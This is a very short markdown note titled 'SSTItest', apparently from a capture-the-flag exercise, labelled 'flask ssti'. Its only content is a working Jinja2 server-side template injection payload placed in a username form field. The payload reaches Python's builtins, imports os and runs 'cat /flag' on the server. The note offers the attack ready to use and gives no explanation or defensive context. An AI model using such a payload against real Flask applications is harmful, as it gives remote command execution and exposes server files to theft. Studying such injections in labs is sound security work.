## SSTItest

flask ssti

```
password=s&username={{g.pop.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()}}
```